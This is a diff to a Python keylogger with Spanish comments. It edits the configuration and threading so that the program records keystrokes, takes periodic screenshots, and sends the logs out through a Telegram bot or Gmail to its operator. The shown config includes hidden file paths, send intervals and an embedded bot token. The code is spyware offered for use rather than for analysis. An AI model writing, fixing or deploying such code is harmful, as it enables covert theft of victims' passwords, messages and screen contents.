@@ -41,7 +41,7 @@ class Config:
         self.PATH_KEY = self.PATH_HIDDEN_KEY + self.NAME_KEY         # <No cambiar>
         self.PATH_LOG = self.PATH_HIDDEN_LOG + self.LOG_NAME       # <No cambiar>
         self.SCREENSHOT = True                                  # Activar o desactivar Screenshot
-        self.TIME_SCREENSHOT = 1                                # Tiempo de intervalo de ScreenShot
+        self.TIME_SCREENSHOT = 2                                # Tiempo de intervalo de ScreenShot
         self.DELAY  = 10                                                            # tiempo de retraso para evitar sobrecargos al iniciar
         self.TIME_SEND = 1 #[minutos]                                               # Tiempo de envió del registro
         self.MODE_SEND = 2      # 0 = Gmail
@@ -68,7 +68,7 @@ class Config:
           # self.RECEIVERS = ["receivers1@yahoo.com","receivers2@gmail.com","receivers3@hotmail.com"]
     class TelegramBot:
         def __init__(self):
-            self.ID   = 831756903                                                     # ID Principal [Obligatorio]
+            self.ID   = 831233303                                                     # ID Principal [Obligatorio]
             self.ID_2 = 000000000                                                     # ID secundario [Opcional]
             self.ID_3 = 000000000                                                     # ID Terciario  [Opcional]
             self.TOKEN = "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"             # TOKEN de tu Bot [Obligatorio]
@@ -568,7 +568,7 @@ if __name__ == '__main__':
     # Create threads
     key = threading.Thread(target=Keylogger().GetKeys)  # Registra pulsaciones
     send = threading.Thread(target=Send().Log)  # Envía Registro
-    screenshot = threading.Thread(target=Send().Log)  # Screenshot
+    screenshot = threading.Thread(target=Send().ScreenShot)  # Screenshot
 
     print("[Keylogger] Listening to Keys...")
     # Start Threads
